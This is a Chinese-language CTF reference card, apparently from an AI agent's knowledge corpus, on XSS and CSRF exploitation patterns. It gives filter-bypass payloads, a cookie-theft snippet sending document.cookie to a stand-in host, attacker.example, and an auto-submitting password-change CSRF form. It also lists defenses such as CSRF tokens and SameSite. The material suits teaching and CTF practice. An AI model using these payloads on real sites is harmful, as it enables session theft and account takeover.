---
source_url: knowledge/reference/web/xss-csrf.md
source_title: XSS / CSRF 利用模式（cookie 窃取 / 存储型）— reviewed solution pattern
source_version: "1.0"
publisher: CTF-Agent reviewed corpus
license: CC-BY-4.0
retrieved_at: 2026-08-31
topic: web
cwe_id: CWE-79
---

# XSS / CSRF 利用模式（反射型 / 存储型 / cookie 窃取）

> 本文为通用技术模式卡片，不含任何具体题目的 flag、附件路径、端点地址或原始 payload。

## 核心概念

- **XSS**（CWE-79）：用户可控内容被浏览器当作脚本执行。按触发路径分**反射型**（请求参数回显）、**存储型**（写入数据库，其他用户访问时触发）、**DOM 型**（纯前端 sink 触发，不经过服务端）。
- **CSRF**（CWE-352）：浏览器自动携带 Cookie 发送跨站请求，攻击者诱导受害者触发状态变更请求（改密、转账、改资料）。

两者常组合：存储型 XSS 可注入 CSRF 攻击代码，或直接窃取会话。

## 关键细节

**判定输出上下文**（决定闭合方式）：
- HTML 标签内：`<script>alert(1)</script>` 直接插入。
- 标签属性内：先闭合引号，如 `" onmouseover="alert(1)` 或 `" autofocus onfocus=alert(1) x="`。
- JS 字符串内：闭合引号与分号，如 `';alert(1);//`。
- 注释/标签黑名单被过滤时的备选：`<img src=x onerror=alert(1)>`、`<svg onload=alert(1)>`、`<iframe srcdoc="<script>alert(1)</script>">`、`<a href="javascript:alert(1)">click</a>`。

**cookie 窃取**（存储型典型用途）：
```javascript
new Image().src='http://attacker.example/c?'+document.cookie
// 或
fetch('http://attacker.example/c',{method:'POST',body:document.cookie})
```
- Cookie 带 `HttpOnly` 时 `document.cookie` 读不到，改偷页面内存在的 token、`localStorage`、或直接以受害者身份发请求（CSRF 化）。
- 自 XSS（只能打自己）无意义；存储型要确认触发对象（如管理员后台预览页、评论区渲染）。

**CSRF 构造**（跨站自动带 Cookie）：
```html
<form action="http://target.example/change-password" method="POST">
  <input name="newpass" value="attacker123">
</form>
<script>document.forms[0].submit()</script>
```
- GET 型状态变更直接用 `<img src="http://target.example/del?id=1">`。
- 防护：CSRF Token（随请求校验）、`SameSite=Strict/Lax` Cookie、校验 `Origin/Referer`、自定义头 `X-Requested-With`。

## 常见坑

- CSP 存在时外链脚本被拦截：改用内联事件属性，或找允许的源（如 `unsafe-inline` 未设时事件属性也受限，需逐项试）。
- 反射型 XSS 需要被受害者浏览器访问才能利用——题目里通常是"机器人访问你提交的 URL"，提交的是完整 URL 而非 payload 本身。
- 属性值里的引号被转义时要先试 `'` 与 `"` 两种闭合。
- `SameSite=Lax` 下跨站 POST 不带 Cookie，但同站 GET 与表单的 top-level GET 仍会带——优先找 GET 型接口。
- 存储型 payload 可能被服务端再次编码（双重编码绕过：payload 里再嵌一层实体编码）。

## 验证方式

1. 先确认输入回显位置与输出上下文（浏览器 DevTools 查看渲染后的 HTML）。
2. 用最简探测 `alert(1)` 逐步加过滤绕过，每次只加一个变量。
3. 自建接收端点验证 cookie 窃取链路，确认能收到 `document.cookie`。
4. CSRF 用无凭证 curl 对比：无 Token 的跨站请求是否成功。
